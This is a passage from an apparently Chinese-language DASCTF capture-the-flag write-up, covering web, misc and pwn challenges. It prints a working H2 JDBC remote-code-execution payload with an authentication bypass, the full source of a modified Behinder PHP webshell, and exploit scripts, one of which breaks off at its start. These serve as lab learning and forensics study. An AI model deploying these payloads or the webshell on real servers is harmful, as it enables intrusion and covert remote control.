class="subst">&#123;url&#125;</span>?shell=?%3E%3C?php%20$context=new%20SplFileObject(%27/tmp/1.txt%27);foreach($context%20as%20$f)&#123;&#123;echo($f);&#125;&#125;&quot;</span>).text</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&quot;DASCTF&#123;.*?&#125;&quot;</span>, result)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Got flag:&quot;</span>, <span class="keyword">match</span>.group(<span class="number">0</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Flag not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2><span id="ze-xi-dao-sai-hou">泽西岛（赛后）</span><a href="#ze-xi-dao-sai-hou" class="header-anchor"></a></h2><p>不出网H2 RCE，利用war包部署，可以直接写入文件</p>
<p>鉴权绕过</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">void</span> <span class="title function_">filter</span>(<span class="params"><span class="title class_">ContainerRequestContext</span> containerRequestContext</span>) &#123;</span><br><span class="line">    <span class="title class_">String</span> path = containerRequestContext.<span class="title function_">getUriInfo</span>().<span class="title function_">getPath</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">isBaseFile</span>(path) &amp;&amp; !<span class="variable constant_">WHITELIST</span>.<span class="title function_">contains</span>(path)) &#123;</span><br><span class="line">        <span class="title class_">String</span> authHeader = containerRequestContext.<span class="title function_">getHeaderString</span>(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (authHeader != <span class="literal">null</span> &amp;&amp; authHeader.<span class="title function_">startsWith</span>(<span class="string">&quot;Bearer &quot;</span>)) &#123;</span><br><span class="line">            <span class="title class_">String</span> token = authHeader.<span class="title function_">substring</span>(<span class="string">&quot;Bearer &quot;</span>.<span class="title function_">length</span>());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="title class_">DecodedJWT</span> var5 = <span class="title class_">JwtValidator</span>.<span class="title function_">verifyJwt</span>(token);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="title class_">Exception</span> var6) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="title function_">abortWithUnauthorized</span>(containerRequestContext);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">abortWithUnauthorized</span>(containerRequestContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">void</span> <span class="title function_">abortWithUnauthorized</span>(<span class="params"><span class="title class_">ContainerRequestContext</span> containerRequestContext</span>) &#123;</span><br><span class="line">    containerRequestContext.<span class="title function_">abortWith</span>(<span class="title class_">Response</span>.<span class="title function_">status</span>(<span class="title class_">Status</span>.<span class="property">UNAUTHORIZED</span>).<span class="title function_">header</span>(<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;/401.jsp&quot;</span>).<span class="title function_">build</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">boolean</span> <span class="title function_">isBaseFile</span>(<span class="params"><span class="title class_">String</span> path</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> !path.<span class="title function_">contains</span>(<span class="string">&quot;/&quot;</span>) &amp;&amp; path.<span class="title function_">contains</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点在这里</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">boolean</span> <span class="title function_">isBaseFile</span>(<span class="params"><span class="title class_">String</span> path</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> !path.<span class="title function_">contains</span>(<span class="string">&quot;/&quot;</span>) &amp;&amp; path.<span class="title function_">contains</span>(<span class="string">&quot;.&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>配置了静态资源的访问，导致了绕过。直接访问&#x2F;api&#x2F;testConnect;.js即可</p>
<p>直接打JDBC RCE就可以，需要一个参数，参考文章</p>
<p><a href="https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html">https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html</a></p>
<p>这里直接注释掉，利用$CATALINA_HOME确定tomcat的根目录</p>
<p>构造Payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbcUrl=jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INI\T=CREATE ALIAS EXEC AS &#x27;void cmd_exec(String cmd) throws java.lang.Exception &#123;Runtime.getRuntime().exec(cmd)\;&#125;&#x27;\;CALL EXEC (&#x27;bash -c &#123;echo,Y2F0IC9mbGFnID4gJENBVEFMSU5BX0hPTUUvd2ViYXBwcy9ST09ULzQwNC5qc3A\=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)\;--\</span><br></pre></td></tr></table></figure>

<h1><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h1><h2><span id="bluetrace">BlueTrace</span><a href="#bluetrace" class="header-anchor"></a></h2><p>一开始先用neta梭了一下，发现能得到一张jpg，发现显示不全</p>
<p><img src="./01279d99-7aaa-4fbe-b3f8-8c406ecf39e4.png" alt="img"></p>
<p>猜测是neta提取的有问题，估计是做限制了，故转手搓：</p>
<p>众所周知蓝牙传输的协议一般是obex，所以过滤一下，可以发现这里明显是传了一个jpg的</p>
<p><img src="./33618614-7e91-4c5f-a7d4-055098b8a52f.png" alt="img"></p>
<p>用tshark导出一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r BlueTrace.pcapng -Y &quot;obex&quot; -T fields -e data &gt; obex_payload.txt</span><br></pre></td></tr></table></figure>

<p>导出后将数据拉到010，分析一下会发现藏了一个压缩包（可以直接将流量包拿去binwalk就会发现有这么个压缩包了）</p>
<p><img src="./fd147174-057a-4b4e-b7c2-c19fad4ce93a.png" alt="img"></p>
<p>全部提取出来，根据010的模板会发现内容是不全的</p>
<p><img src="./7a0a5ddc-f7e4-4136-a343-baa4fbe15438.png" alt="img"></p>
<p>回到wireshark分析一下，会发现在最后面还漏了一个流量数据，将他单独提取出来拼上后即可修复压缩包</p>
<p><img src="./604fb2fb-2908-4fa7-84b1-5d95d5a7ee69.png" alt="img"></p>
<p>打开后它提示我们密码是蓝牙传输的目标电脑名字</p>
<p><img src="./a0b85729-7f2a-4fb2-9920-5a9135aa631a.png" alt="img"></p>
<p>在wireshark的无线中找到蓝牙设备，然后简单遍历一下就知道密码是<code>INFERNITYのPC</code></p>
<p><img src="./6b95853a-1064-4cec-b6e9-49d61a22f66d.png" alt="img"></p>
<p>解压得到一张奇怪的png图，猜测是lsb隐写，stegsolve分析找到flag</p>
<p><img src="./6135bd3f-db5e-436d-87cb-603e8139a4c1.png" alt="img"></p>
<h2><span id="webshell-plus">Webshell Plus</span><a href="#webshell-plus" class="header-anchor"></a></h2><p>根据题意易得webshell流量，那么就看是哪种常见的，简单分析可以发现传了个shell.php</p>
<p><img src="./26764c97-ca32-4fdf-8663-1181593712d9.png" alt="img"></p>
<p>其内容如下，不难看出就是冰蝎，但又不太一样，显然魔改了，一开始会进行检测，当攻击者进行密钥交换时（传入gene_key和public_key），shell的key为一个随机的8字节的字符串转hex后取md5的前16个字符，然后用这个key结合传入的public_key进行openssl加密，最后输出被两个8长度的伪造base64字符串包含的base64字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundary2AdFNokm3wx5QuXV </span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span> </span><br><span class="line">Content-Type: text/php </span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">geneB64RandStr</span>(<span class="params"><span class="keyword">int</span> <span class="variable">$length</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$validChars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>;</span><br><span class="line">    <span class="variable">$maxIndex</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$validChars</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$validChars</span>[<span class="title function_ invoke__">random_int</span>(<span class="number">0</span>, <span class="variable">$maxIndex</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;gene_key&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;public_key&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">geneB64RandStr</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;public_key&#x27;</span>]);</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">8</span>));</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$p</span>), <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>] = <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">openssl_public_encrypt</span>(<span class="variable">$p</span>, <span class="variable">$encrypted_key</span>, <span class="variable">$public_key</span>, OPENSSL_PKCS1_PADDING);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$encrypted_key</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">geneB64RandStr</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;OpenSSL extension not available&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">// Default key: rebeyond</span></span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>] = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line"> <span class="title function_ invoke__">session_write_close</span>();</span><br><span class="line"> <span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">  <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">       &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line"> &#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">------WebKitFormBoundary2AdFNokm3wx5QuXV-- </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接着分析，发现攻击者确认传了这俩参数，所以key值就不是默认的了，可以看到回显就是被两个8长度的伪造base64字符串包含的base64字符串，现在要做的就是找到RSA的私钥去解出p值和key</p>
<p><img src="./3c888a6d-f36e-43ef-b53a-85a8d18181de.png" alt="1"></p>
<p>用厨子解一下传入的public_key，可以得到RSA的公钥，结合搜到的这篇文章</p>
<p><a href="https://weiyubo.top/2019/03/31/RSA%20%E8%A7%A3%E5%AF%86%20%EF%BC%88%E5%B7%B2%E7%9F%A5%E5%85%AC%E9%92%A5%EF%BC%89/%EF%BC%8C%E7%88%86%E7%A0%B4%E7%A7%81%E9%92%A5">https://weiyubo.top/2019/03/31/RSA%20%E8%A7%A3%E5%AF%86%20%EF%BC%88%E5%B7%B2%E7%9F%A5%E5%85%AC%E9%92%A5%EF%BC%89/，爆破私钥</a></p>
<p><img src="./2e926d28-f8fc-4254-957f-be28978ff2f6.png" alt="img"></p>
<p>用这个在线网站<a href="https://www.ssleye.com/ssltool/pub_asysi.html%E8%A7%A3%E5%87%BAn%EF%BC%8C%E7%84%B6%E5%90%8E%E7%94%A8yafu%E7%88%86%E7%A0%B4%E5%BE%97%E5%88%B0p%E5%92%8Cq%EF%BC%8C%E6%8E%A5%E7%9D%80%E6%8C%89%E7%85%A7%E6%96%87%E7%AB%A0%E6%93%8D%E4%BD%9C%E5%BE%97%E5%87%BA%E7%A7%81%E9%92%A5%E6%96%87%E4%BB%B6%E5%8D%B3%E5%8F%AF">https://www.ssleye.com/ssltool/pub_asysi.html解出n，然后用yafu爆破得到p和q，接着按照文章操作得出私钥文件即可</a></p>
<p><img src="./d78b73c2-3401-40e4-bc31-0384887b9250.png" alt="img"></p>
<p>然后搓个脚本解出p和key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将下面两项替换成你实际的数据</span></span><br><span class="line">encrypted_b64 = <span class="string">&quot;O+le5pAWzAptt0OhVjS5eDX3W3X766Hc8QbKMNflhkZM3t8HArZ8YRFM3G7h7MMYrcASwycx7aSU1OL2tChk3O/O8cjw/0C6Agx5qEDeiI3gtnic5/J+cLB0WcspW2t9OiqteGHBtXZx0cXUjUSU/7tPwfnOS3pXjrJRDisgSwE=&quot;</span></span><br><span class="line">private_key_pem = <span class="string">&quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICWgIBAAKBgFgmOymT9EJvC8sHTWxov0LQWSomL5DPRiTUEnQnrDmKYGvNSNMJ3V1fR1hr9jQ6</span></span><br><span class="line"><span class="string">oepvQvjMyWsyTL6J3n9nbOGd5tey/4BLTXHQyaXcSpfl3z61fBJzy91rZrXbzMY1adHH4VYyUoDQ</span></span><br><span class="line"><span class="string">7qkF2/RVnR8PJVzRoJn+XaH3RabkzHitAgMBAAECgYAb6zfvykmhxPQSQOTXwjFZow2qmN+V2OBZ</span></span><br><span class="line"><span class="string">h8W0fmBA9T/mxOUc2lH/Yc8CBWe8URm5W7X1gT8GMa825gnPhl1olOcG9QDtvsWZlLa2YIE1VmH9</span></span><br><span class="line"><span class="string">VexRu+CTaA8YfdQlOQP81P5A8kLOfpqAwvOa166HTTUOLZj1t/wn5DNGDdDnTQJBAJY4ecYJt6OW</span></span><br><span class="line"><span class="string">6LJsCDoPHDjYPZCtcAv3rAhawzNhltW7Zd5uzN0GqigOWpt+u63pnRXb2HYp2zR5sR/HBbXRqoMC</span></span><br><span class="line"><span class="string">QQCWOHnGCbejluiybAg6Dxw42D2QrXAL96wIWsMzYZbVu2XebszdBqooDlqbfrut6Z0V29h2Kds0</span></span><br><span class="line"><span class="string">ebEfxwW10akPAkAomKSYF2IwbIUASt/CSPkYh5/DrIteQJWWQGkGRrZLlnRGM21bwgRUBOUJpqsz</span></span><br><span class="line"><span class="string">qbGRCbOq407hFI4Ah3mMlFffAkANotDC/kzSJ7e1woK4qnh4XICyKlw6aeAO3hZMCrbDbgBgQZSN</span></span><br><span class="line"><span class="string">F7bIbg0hgk6NCeC9hDhQ+ZmxWL6QUOOezopXAkAJSa9xZ9Ocse67NBlIaCj4gPuMYs8viR6X6hW0</span></span><br><span class="line"><span class="string">CXl/c4Aa0+0Cp6NLbD4IPNMseRxK/GNnpl9yCkbSexnQvzMl</span></span><br><span class="line"><span class="string">-----END RSA PRIVATE KEY-----&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码Base64后的密文</span></span><br><span class="line">encrypted_bytes = b64decode(encrypted_b64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入私钥</span></span><br><span class="line">rsa_key = RSA.import_key(private_key_pem)</span><br><span class="line">cipher_rsa = PKCS1_v1_5.new(rsa_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">sentinel = <span class="string">b&quot;&quot;</span></span><br><span class="line">decrypted_p = cipher_rsa.decrypt(encrypted_bytes, sentinel)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Recovered p (hex):&quot;</span>, decrypted_p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Derived AES key (md5(p)[:16]):&quot;</span>, <span class="built_in">__import__</span>(<span class="string">&quot;hashlib&quot;</span>).md5(decrypted_p).hexdigest()[:<span class="number">16</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] Recovered p (hex): b&#x27;519a73ca97a9e3ea&#x27;</span></span><br><span class="line"><span class="comment"># [+] Derived AES key (md5(p)[:16]): d14d8ce94563e71a</span></span><br></pre></td></tr></table></figure>

<p>得到key就可以对流量解密了</p>
<p>用在线网站 <a href="http://tools.bugscaner.com/cryptoaes/">http://tools.bugscaner.com/cryptoaes/</a> 解密，然后base64解一下msg，最后爆破shadow的hash即可得到密码</p>
<p><img src="./d10d1d52-b2ec-4fd6-81c9-4785a7028753.png" alt="img"></p>
<p><img src="./8e853000-f963-4e15-8f83-b8a3275b16d4.png" alt="img"></p>
<p><img src="./89855f6a-481a-427e-81ad-63ec6883d3f2.png" alt="img"></p>
<p>md5之后就是flag</p>
<h1><span id="pwn">Pwn</span><a href="#pwn" class="header-anchor"></a></h1><h2><span id="mini">mini</span><a href="#mini" class="header-anchor"></a></h2><p>Only read 挑战，给了 pop rax 但是我没有用到，</p>
<p>参考这个文章的3 个 gadget <a href="https://github.com/imLZH1/2025-CTF-writep/tree/main/2025-smileyCTF#pwnbabyrop">https://github.com/imLZH1/2025-CTF-writep/tree/main/2025-smileyCTF#pwnbabyrop</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import CDLL</span></span><br><span class="line"><span class="comment">#cdl = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">s    = <span class="keyword">lambda</span>   x : io.send(x)</span><br><span class="line">sa   = <span class="keyword">lambda</span> x,y : io.sendafter(x,y)</span><br><span class="line">sl   = <span class="keyword">lambda</span>   x : io.sendline(x)</span><br><span class="line">sla  = <span class="keyword">lambda</span> x,y : io.sendlineafter(x,y)</span><br><span class="line">r    = <span class="keyword">lambda</span> x   : io.recv(x)</span><br><span class="line">ru   = <span class="keyword">lambda</span> x   : io.recvuntil(x)</span><br><span class="line">rl   = <span class="keyword">lambda</span>     : io.recvline()</span><br><span class="line">itr  = <span class="keyword">lambda</span>     : io.interactive()</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ls   = <span class="keyword">lambda</span> x   : log.success(x)</span><br><span class="line">lss  = <span class="keyword">lambda</span> x   : ls(<span class="string">&#x27;\033[1;31;40m%s -&gt; 0x%x \033[0m&#x27;</span> % (x, <span class="built_in">eval</span>(x)))</span><br><span class="line"></span><br><span class="line">attack = <span class="string">&#x27;node5.buuoj.cn:29466&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">binary = <span class="string">&#x27;./chal&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> 